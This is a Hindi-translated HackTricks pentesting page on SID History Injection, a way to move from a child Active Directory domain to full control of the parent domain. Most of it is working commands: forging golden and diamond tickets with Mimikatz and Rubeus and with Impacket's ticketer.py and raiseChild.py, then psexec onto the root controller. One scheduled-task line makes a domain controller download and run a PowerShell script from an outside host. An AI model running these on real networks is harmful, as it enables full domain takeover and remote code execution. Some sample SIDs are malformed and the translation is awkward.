# SID इतिहास अधिकरण हमला

**SID इतिहास अधिकरण हमला** का मुख्य ध्यान **उपयोगकर्ता प्रवास बीच डोमेन** की सहायता करना है जबकि पुराने डोमेन से संसाधनों तक का निरंतर पहुंच सुनिश्चित करना। इसे उनके नए खाते के **SID इतिहास में उपयोगकर्ता की पिछली सुरक्षा पहचानकर्ता (SID) शामिल करके** पूरा किया जाता है। विशेष रूप से, इस प्रक्रिया का दुरुपयोग करके अनधिकृत पहुंच प्रदान करने के लिए माता-पिता डोमेन से उच्च विशेषाधिकार समूह (जैसे कि एंटरप्राइज व्यवस्थापक या डोमेन व्यवस्थापक) का SID इतिहास में जोड़ा जा सकता है। यह शोषण माता-पिता डोमेन के सभी संसाधनों तक पहुंच प्रदान करता है।

इस हमले को कार्रवाई करने के लिए दो विधियां मौजूद हैं: **एक स्वर्ण टिकट** या **डायमंड टिकट** के निर्माण के माध्यम से।

**"एंटरप्राइज व्यवस्थापक"** समूह के SID को पहचानने के लिए, पहले रूट डोमेन का SID ढूंढना आवश्यक है। पहचान के बाद, "एंटरप्राइज व्यवस्थापक" समूह का SID रूट डोमेन के SID में `-519` जोड़कर निर्मित किया जा सकता है। उदाहरण के लिए, यदि रूट डोमेन SID `S-1-5-21-280534878-1496970234-700767426` है, तो "एंटरप्राइज व्यवस्थापक" समूह के लिए परिणामी SID `S-1-5-21-280534878-1496970234-700767426-519` होगा।

आप **डोमेन व्यवस्थापक** समूह का भी उपयोग कर सकते हैं, जो **512** में समाप्त होता है।

दूसरे डोमेन के समूह के SID को खोजने का एक और तरीका है (उदाहरण के लिए "डोमेन व्यवस्थापक") के साथ:
```powershell
Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
```
### गोल्डन टिकट (Mimikatz) के साथ KRBTGT-AES256

{% code overflow="wrap" %}
```bash
mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<current_domain_sid> /sids:<victim_domain_sid_of_group> /aes256:<krbtgt_aes256> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"

/user is the username to impersonate (could be anything)
/domain is the current domain.
/sid is the current domain SID.
/sids is the SID of the target group to add ourselves to.
/aes256 is the AES256 key of the current domain's krbtgt account.
--> You could also use /krbtgt:<HTML of krbtgt> instead of the "/aes256" option
/startoffset sets the start time of the ticket to 10 mins before the current time.
/endin sets the expiry date for the ticket to 60 mins.
/renewmax sets how long the ticket can be valid for if renewed.

# The previous command will generate a file called ticket.kirbi
# Just loading you can perform a dcsync attack agains the domain
```
{% endcode %}

गोल्डन टिकट के बारे में अधिक जानकारी के लिए देखें:

{% content-ref url="golden-ticket.md" %}
[golden-ticket.md](golden-ticket.md)
{% endcontent-ref %}

### डायमंड टिकट (Rubeus + KRBTGT-AES256)

{% code overflow="wrap" %}
```powershell
# Use the /sids param
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap

# Or a ptt with a golden ticket
Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt

# You can use "Administrator" as username or any other string
```
{% endcode %}

डायमंड टिकट्स के बारे में अधिक जानकारी के लिए देखें:

{% content-ref url="diamond-ticket.md" %}
[diamond-ticket.md](diamond-ticket.md)
{% endcontent-ref %}

{% code overflow="wrap" %}
```bash
.\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
.\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
ls \\mcorp-dc.moneycorp.local\c$
```
{% endcode %}

संकटित डोमेन के KRBTGT हैश का उपयोग करके डीए या रूट या एंटरप्राइज व्यवस्थापक तक उन्नति करें: 

{% code overflow="wrap" %}
```bash
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'

Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"'

gwmi -class win32_operatingsystem -ComputerName mcorpdc.moneycorp.local

schtasks /create /S mcorp-dc.moneycorp.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "STCheck114" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"

schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
```
{% endcode %}

हमले से प्राप्त अनुमतियों के साथ आप नए डोमेन में उदाहरण के रूप में DCSync हमला कर सकते हैं:

{% content-ref url="dcsync.md" %}
[dcsync.md](dcsync.md)
{% endcontent-ref %}

### लिनक्स से

#### [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py) के साथ मैन्युअल
```bash
# This is for an attack from child to root domain
# Get child domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep "Domain SID"
# Get root domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep -B20 "Enterprise Admins" | grep "Domain SID"

# Generate golden ticket
ticketer.py -nthash <krbtgt_hash> -domain <child_domain> -domain-sid <child_domain_sid> -extra-sid <root_domain_sid> Administrator

# NOTE THAT THE USERNAME ADMINISTRATOR COULD BE ACTUALLY ANYTHING
# JUST USE THE SAME USERNAME IN THE NEXT STEPS

# Load ticket
export KRB5CCNAME=hacker.ccache

# psexec in domain controller of root
psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
```
{% endcode %}

#### स्वचालित रूप से [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py) का उपयोग

यह एक Impacket स्क्रिप्ट है जो **बच्चे से माता-पिता डोमेन में उन्नति को स्वचालित करेगा**। स्क्रिप्ट को आवश्यकता है:

* लक्ष्य डोमेन कंट्रोलर
* बच्चे डोमेन में एडमिन उपयोगकर्ता के लिए Creds

फ्लो निम्नलिखित है:

* माता-पिता डोमेन के एंटरप्राइज एडमिन्स समूह के लिए SID प्राप्त करता है
* बच्चे डोमेन में KRBTGT खाते के लिए हैश पुनः प्राप्त करता है
* एक Golden Ticket बनाता है
* माता-पिता डोमेन में लॉगिन करता है
* माता-पिता डोमेन में व्यवस्थापक खाते के लिए क्रेडेंशियल पुनः प्राप्त करता है
* यदि `target-exec` स्विच निर्दिष्ट किया गया है, तो यह माता-पिता डोमेन के डोमेन कंट्रोलर के माध्यम से Psexec के माध्यम से प्रमाणीकृत होता है।
```bash
raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
```
## संदर्भ
* [https://adsecurity.org/?p=1772](https://adsecurity.org/?p=1772)
* [https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी का हैकट्रिक्स में विज्ञापित करना चाहते हैं**? या क्या आप **PEASS के नवीनतम संस्करण का उपयोग करना चाहते हैं या हैकट्रिक्स को पीडीएफ में डाउनलोड करना चाहते हैं**? [**सब्सक्रिप्शन प्लान**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**द पीएस फैमिली**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**एनएफटी**](https://opensea.io/collection/the-peass-family) संग्रह।
* [**आधिकारिक PEASS और हैकट्रिक्स स्वैग**](https://peass.creator-spring.com) प्राप्त करें।
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या **मुझे** **ट्विटर** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)** पर** **फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें, [हैकट्रिक्स रेपो](https://github.com/carlospolop/hacktricks) और [हैकट्रिक्स-क्लाउड रेपो](https://github.com/carlospolop/hacktricks-cloud)** को पीआर जमा करके।

</details>
